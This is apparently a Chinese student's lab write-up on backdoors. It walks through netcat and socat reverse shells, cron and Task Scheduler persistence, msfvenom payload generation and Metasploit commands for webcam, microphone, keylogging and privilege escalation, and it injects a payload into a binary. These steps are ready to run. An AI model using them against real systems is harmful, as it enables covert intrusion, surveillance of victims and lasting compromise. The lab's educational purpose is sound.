<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第2次实验-后门原理与实践 - Ethan Chase‘s Site</title><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html"><link rel="alternate" type="application/atom+xml" href="https://Ethan-Chase.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://Ethan-Chase.github.io/feed.json"><meta property="og:title" content="第2次实验-后门原理与实践"><meta property="og:site_name" content="Ethan Chase‘s Site"><meta property="og:description" content=""><meta property="og:url" content="https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html"><meta property="og:type" content="article"><link rel="stylesheet" href="https://Ethan-Chase.github.io/assets/css/style.css?v=6fbb1e8931a5afe843374fd67c192c86"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html"},"headline":"第2次实验-后门原理与实践","datePublished":"2024-04-08T15:54","dateModified":"2024-04-08T15:54","description":"","author":{"@type":"Person","name":"Ethan Chase","url":"https://Ethan-Chase.github.io/authors/ethan-chase/"},"publisher":{"@type":"Organization","name":"Ethan Chase"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body><div class="site-container"><header class="top" id="js-header"><a class="logo" href="https://Ethan-Chase.github.io/">Ethan Chase‘s Site</a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li class="has-submenu"><a href="https://Ethan-Chase.github.io/tags/" target="_self" aria-haspopup="true">实验记录</a><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://Ethan-Chase.github.io/tags/wang-luo-dui-kang/" target="_self">网络对抗</a></li></ul></li></ul></nav><div class="search"><div class="search__overlay js-search-overlay"><div class="search__overlay-inner"><button class="search__close js-search-close" aria-label="Close">Close</button></div></div><button class="search__btn js-search-btn" aria-label="Search"><svg role="presentation" focusable="false"><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#search"/></svg></button></div></header><main><article class="post"><div class="hero"><header class="hero__content"><div class="wrapper"><div class="post__meta"><time datetime="2024-04-08T15:54">四月 8, 2024</time></div><h1>第2次实验-后门原理与实践</h1><div class="post__meta post__meta--author"><a href="https://Ethan-Chase.github.io/authors/ethan-chase/" class="feed__author">Ethan Chase</a></div></div></header></div><div class="wrapper post__entry"><h1 id="第2次实验-后门原理与实践">第2次实验-后门原理与实践</h1><h2 id="1基础问题回答">1基础问题回答</h2><h3 id="1例举你能想到的一个后门进入到你系统中的可能方式？">(1)例举你能想到的一个后门进入到你系统中的可能方式？</h3><p>一个常见的方式是通过未修补的软件漏洞。攻击者可以利用这些漏洞来执行远程代码，安装后门程序。例如，如果一个操作系统或应用软件存在已知但未被及时修补的安全漏洞，攻击者可以专门针对这个漏洞设计代码来获取系统的访问权限。</p><h3 id="2例举你知道的后门如何启动起来win及linux的方式？">(2)例举你知道的后门如何启动起来(win及linux)的方式？</h3><ul><li><strong>Windows:</strong> 一个常见的启动后门的方式是通过修改注册表来确保恶意软件每次启动时自动运行。例如，攻击者可能会在<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>键下添加一个条目，使其指向一个恶意程序。</li><li><strong>Linux:</strong> 在Linux系统中，攻击者可能会修改<code>/etc/rc.local</code>文件或者使用<code>cron</code>作业来确保后门在系统启动或定期时自动执行。通过这种方式，即使系统重启，后门程序也能自动运行。</li></ul><h3 id="3meterpreter有哪些给你映像深刻的功能？">(3)Meterpreter有哪些给你映像深刻的功能？</h3><ul><li><strong>屏幕截取和键盘记录：</strong> Meterpreter可以截取用户屏幕的快照，以及记录键盘输入，这使得攻击者可以远程监视用户的活动。</li><li><strong>提权：</strong> 通过各种技术，Meterpreter能够从普通用户权限提升到系统或管理员权限。</li><li><strong>隐形：</strong> Meterpreter能够通过各种手段隐藏其在系统中的存在，包括内存驻留而不是写入硬盘，以及清理日志记录等方式。</li><li><strong>数据窃取：</strong> Meterpreter可以窃取系统信息、文件以及其他敏感数据，并能够上传或下载文件，修改文件权限等。</li></ul><h3 id="4如何发现自己有系统有没有被安装后门？">(4)如何发现自己有系统有没有被安装后门？</h3><ul><li><strong>使用安全软件：</strong> 安装和使用安全软件，如防病毒和反恶意软件工具，这些工具可以帮助检测和移除后门程序。</li><li><strong>检查系统启动项和运行中的进程：</strong> 审查系统的启动项和当前运行的进程列表，寻找任何异常或不认识的条目。在Windows中，可以使用任务管理器和<code>msconfig</code>；在Linux中，可以使用<code>ps</code>命令和<code>cron</code>作业列表。</li><li><strong>网络监控：</strong> 使用网络监控工具来检测异常的出站连接。后门程序通常会尝试与远程服务器通信，这可能会在网络流量分析中显示出来。</li><li><strong>系统日志：</strong> 检查系统日志文件，寻找异常的登录尝试、权限提升活动或其他可疑行为的迹象。</li></ul><h2 id="2实验内容">2实验内容</h2><h3 id="20环境准备与基础知识">2.0环境准备与基础知识</h3><h4 id="201ncat">2.0.1Ncat</h4><p>Ncat 是一个功能丰富的网络工具，它继承自原始的 Netcat 工具的灵活性，并加入了更多的功能和改进。Ncat 作为 Nmap 项目的一部分，专为网络调试和探索而设计，可以用于创建任何类型的连接，包括 TCP、UDP、SCTP 和 Unix 域套接字连接。Ncat 的一些关键功能包括：</p><ul><li>支持 SSL 加密，允许安全地发送数据。</li><li>可以作为客户端和服务器运行，便于设置监听端口和接受连接。</li><li>提供内置的脚本引擎，允许用户执行特定的网络任务。</li><li>支持代理和代理链，使其能够通过各种网络层进行数据传输。</li></ul><h4 id="202socat">2.0.2Socat</h4><p>Socat 是一个命令行基础的多功能网络工具，它被认为比 Netcat 更加强大。Socat 能够处理双向数据传输，支持多种协议和数据类型，包括 IPv4、IPv6、TCP、UDP、Unix 域套接字等。它的一些高级功能包括：</p><ul><li>能够将几乎任何类型的数据流重定向到网络套接字、文件、管道、设备和程序之间。</li><li>支持 SSL 加密和认证，提供了数据传输的安全性。</li><li>具备端口重定向、网络桥接和代理功能。</li><li>可以用作网络调试工具，网络服务模拟器和为网络应用提供复杂的配置。</li></ul><blockquote><p>[!NOTE]</p><p>老师给的socat无法运行的可以前往<a href="https://github.com/honuonhval/socat-win10">honuonhval/socat-win10: Compiled socat for Windows 10 included instruction for reproducibility (github.com)</a>下载</p></blockquote><h4 id="203cron-启动">2.0.3Cron 启动</h4><p>Cron 是 Unix 和 Linux 系统中用于定时任务调度的服务。它允许用户安排在特定时间和日期自动运行脚本和命令。Cron 任务由 Cron 表（Crontab）管理，Crontab 文件包含了一系列的条目，每个条目代表一个定时任务。Cron 的使用场景包括定时备份、系统维护任务、定期检查系统状态等。</p><p>Cron 启动的任务通过编辑 Crontab 文件来配置。使用 <code>crontab -e</code> 命令可以编辑当前用户的 Crontab 文件，其中每一行代表一个任务，包括运行的时间和要执行的命令。</p><h4 id="204任务计划启动">2.0.4任务计划启动</h4><p>在 Windows 系统中，任务计划器（Task Scheduler）是一个图形界面工具，用于安排自动执行任务的时间。用户可以利用任务计划器在特定时间或当发生特定事件时自动启动程序或脚本。</p><p>任务计划器的使用场景非常广泛，包括自动备份、软件更新、系统维护等。创建新的任务时，可以配置多种设置，如触发器（定义任务何时运行）、操作（定义任务运行什么程序或脚本）、条件（定义任务运行的条件）和设置（进一步定义任务的行为）。</p><h3 id="21使用netcat获取主机操作shell，cron启动">2.1使用netcat获取主机操作Shell，cron启动</h3><h4 id="211win获得linux-shell">2.1.1Win获得Linux Shell</h4><p>1.windows 打开监听</p><pre><code class="language-sh">ncat.exe -l -p 4325
</code></pre><p>2.Linux反弹连接win</p><pre><code class="language-bash">nc 192.168.0.243 4325 -e /bin/sh
</code></pre><p>3.windows下获得一个linux shell，可运行任何指令，如ls</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323144818078.png" alt="image-20240323144818078" data-is-external-image="true"></figure><h4 id="212corn启动">2.1.2corn启动</h4><p>想要在之后linux启动后就能获得其控制，便需要我们配置<strong>Cron定时任务</strong>，使linux每隔一段时间就进行反弹连接</p><p>1.打开corn配置</p><pre><code class="language-bash">crontab -e
</code></pre><p>2.添加任务使其每分钟尝试进行反弹连接</p><pre><code class="language-bash">* * * * * nc 192.168.0.243 4325 -e /bin/sh
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323152304381.png" alt="image-20240323152304381" data-is-external-image="true"></figure><p>3.windos进行监听</p><pre><code class="language-sh">ncat.exe -l -p 4325
</code></pre><p>等待下次执行即可获得控制</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323152703554.png" alt="image-20240323152703554" data-is-external-image="true"></figure><h4 id="213linux获得win-shell">2.1.3Linux获得Win Shell</h4><p>1.Linux运行监听指令</p><pre><code class="language-bash">nc -l -p 4325
</code></pre><p>2.Windows反弹连接Linux</p><pre><code class="language-sh">ncat.exe -e cmd.exe 192.168.255.137 4325
</code></pre><p>3.Linux下看到Windows的命令提示</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323145033335.png" alt="image-20240323145033335" data-is-external-image="true"></figure><h3 id="22使用socat获取主机操作shell-任务计划启动">2.2使用socat获取主机操作Shell, 任务计划启动</h3><h4 id="220-socat基础使用">2.2.0 Socat基础使用</h4><p>监听端口</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre><p>远程连接端口</p><pre><code class="language-sh">socat - TCP:192.168.0.243:4325 
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323153648013.png" alt="image-20240323153648013" data-is-external-image="true"></figure><h4 id="221win获得linux-shell">2.2.1Win获得Linux Shell</h4><p>1.windows 打开监听</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre><p>2.Linux反弹连接win</p><pre><code class="language-bash">socat TCP:192.168.0.243:4325 EXEC:&#39;/bin/sh&#39;,pty,stderr,setsid,sigint,sane
</code></pre><p>3.windows下获得一个linux shell，可运行任何指令，如ls</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323154111147.png" alt="image-20240323154111147" data-is-external-image="true"></figure><h4 id="222linux获得win-shell">2.2.2Linux获得Win Shell</h4><p>1.Linux运行监听指令</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre><p>2.Windows反弹连接Linux</p><pre><code class="language-sh">socat TCP:192.168.255.137:4325 EXEC:&#39;cmd.exe&#39;,pty,stderr,setsid,sigint,sane

ncat.exe -e cmd.exe 192.168.255.137 4325
</code></pre><p>3.Linux下看到Windows的命令提示</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323154619694.png" alt="image-20240323154619694" data-is-external-image="true"></figure><h4 id="223任务计划启动">2.2.3任务计划启动</h4><p>想要在之后windows启动后就能获得其控制，便需要我们配置<strong>任务计划启动</strong>，使windows每隔一段时间就进行反弹连接</p><p>1.在”Windows-&gt;控制面板-&gt;管理工具-&gt;任务计划程序“中新建任务计划</p><p>配置触发器为工作站锁定时</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155827943.png" alt="image-20240323155827943" data-is-external-image="true"></figure><p>2.操作设置为：</p><p>启动程序<code>C:\Users\lenovo\Desktop\socat-win10-main\socat.exe</code></p><p>添加参数<code>TCP:192.168.255.137:4325 EXEC:&#39;cmd.exe&#39;,pty,stderr,setsid,sigint,sane</code></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155853377.png" alt="image-20240323155853377" data-is-external-image="true"></figure><p>3.在linux端开启监听</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre><p>4.锁定win界面后触发，linux获得win shell并执行之前输入的systeminfo命令</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155930342.png" alt="image-20240323155930342" data-is-external-image="true"></figure><h3 id="23使用msf-meterpreter（或其他软件）生成可执行文件，利用ncat或socat传送到主机并运行获取主机shell">2.3使用MSF meterpreter（或其他软件）生成可执行文件，利用ncat或socat传送到主机并运行获取主机Shell</h3><pre><code class="language-shell">192.168.255.137
</code></pre><p>1.生成后门软件</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_20214325.exe
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171348784.png" alt="image-20240323171348784" data-is-external-image="true"></figure><p>2.打开监听进程</p><pre><code class="language-shell">msfconsole
</code></pre><pre><code class="language-shell">use exploit/multi/handler
</code></pre><pre><code class="language-shell">set payload windows/meterpreter/reverse_tcp
</code></pre><pre><code class="language-shell">set LHOST 192.168.255.137
</code></pre><pre><code class="language-shell">set LPORT 4325
</code></pre><pre><code class="language-shell"> show options
</code></pre><pre><code class="language-shell">run
</code></pre><p>成功获取</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171214418.png" alt="image-20240323171214418" data-is-external-image="true"></figure><h3 id="24使用msf-meterpreter（或其他软件）生成获取目标主机音频、摄像头、击键记录等内容，并尝试提权">2.4使用MSF meterpreter（或其他软件）生成获取目标主机音频、摄像头、击键记录等内容，并尝试提权</h3><p>1.获取音频</p><pre><code class="language-shell">record_mic
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171656121.png" alt="image-20240323171656121" data-is-external-image="true"></figure><p>2.获取屏幕截图</p><pre><code class="language-shell">screenshot
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171534468.png" alt="image-20240323171534468" data-is-external-image="true"></figure><p>3.摄像头拍照</p><pre><code class="language-shell">webcam_snap
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171908972.png" alt="image-20240323171908972" data-is-external-image="true"></figure><p>4.键盘记录</p><p>开始记录</p><pre><code class="language-shell">keyscan_start
</code></pre><p>一段时间后导出记录</p><pre><code class="language-shell">keyscan_dump
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323172157525.png" alt="image-20240323172157525" data-is-external-image="true"></figure><p>5.提权</p><p>1.以管理员身份运行后门软件</p><p>2.查看当前身份</p><pre><code class="language-shell">getuid
</code></pre><p>3.提权</p><pre><code class="language-shell">getsystem
</code></pre><p>再次查看身份发现提权成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323172920474.png" alt="image-20240323172920474" data-is-external-image="true"></figure><h3 id="25可选加分内容：使用msf生成shellcode注入到实践1中的pwn1中，获取反弹连接shell">2.5可选加分内容：使用MSF生成shellcode,注入到实践1中的pwn1中，获取反弹连接Shell</h3><p>使用msf生成shellcode并注入到pwn20214325中</p><pre><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -x pwn20214325 -f elf &gt; pwn20214325_with_backdoor
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014137497.png" alt="image-20240326014137497" data-is-external-image="true"></figure><p>打开msfconsole并设置载荷、监听IP和端口</p><pre><code class="language-shell">msfconsole
</code></pre><pre><code class="language-shell">use exploit/multi/handler
</code></pre><pre><code>set payload linux/x86/meterpreter/reverse_tcp
</code></pre><pre><code class="language-shell">set LHOST 192.168.255.137
</code></pre><pre><code class="language-shell">set LPORT 4325
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014227214.png" alt="image-20240326014227214" data-is-external-image="true"></figure><p>开始监听</p><pre><code class="language-shell">run
</code></pre><p>在靶机端执行后面软件pwn20214325_with_backdoor后攻击成功</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014433268.png" alt="image-20240326014433268" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014459958.png" alt="image-20240326014459958" data-is-external-image="true"></figure><p>使用mkdir在靶机上创建文件夹attack</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014610661.png" alt="image-20240326014610661" data-is-external-image="true"></figure><p>靶机桌面上出现了attack文件夹</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014630668.png" alt="image-20240326014630668" data-is-external-image="true"></figure><h2 id="3实验总结与体会">3实验总结与体会</h2><p>通过本次实验，我学会了如何使用msf进行后门软件生成和通过后门对靶机进行控制，也掌握了如何在渗透成功之后通过配置Cron或任务计划进行后门的维持，理解了反弹连接及其使用ncat和socat的实现方法。</p><p>在初步使用过msf之后我最大的感受就是对电脑安全的不信任，虽然实验是在关闭所有防火墙和杀毒软件之后完成的，但我相信只要进一步的学习相关知识就能轻松的突破一半家用防火墙和杀毒软件的防御实现真正的攻击，那时所有电脑上的个人隐私都将在攻击下被别人一览无余。也启示我们要在网络上谨防钓鱼攻击，遇到奇怪的网址和邮件等时都要小心点击，下载软件时也要尽量避免盗版软件，尽可能降低自己电脑被有害木马软件攻击勒索的可能性。</p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on 四月 8, 2024</p><ul class="post__tag"><li><a href="https://Ethan-Chase.github.io/tags/wang-luo-dui-kang/">网络对抗</a></li></ul><div class="post__share"></div><div class="post__bio bio"><div><h3 class="bio__name"><a href="https://Ethan-Chase.github.io/authors/ethan-chase/" rel="author">Ethan Chase</a></h3></div></div></footer></article><nav class="post__nav"><div class="post__nav-inner"><div class="post__nav-prev"><svg width="1.041em" height="0.416em" aria-hidden="true"><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#arrow-prev"/></svg> <a href="https://Ethan-Chase.github.io/di-1ci-shi-yan-ni-xiang-yu-bofji-chu.html" class="post__nav-link" rel="prev"><span>Previous</span> 第1次实验-逆向与BOF基础</a></div></div></nav></main><footer class="footer"><div class="footer__copyright"><p>Powered by Publii</p></div><button onclick="backToTopFunction()" id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></footer></div><script defer="defer" src="https://Ethan-Chase.github.io/assets/js/scripts.min.js?v=f47c11534595205f20935f0db2a62a85"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script></body></html>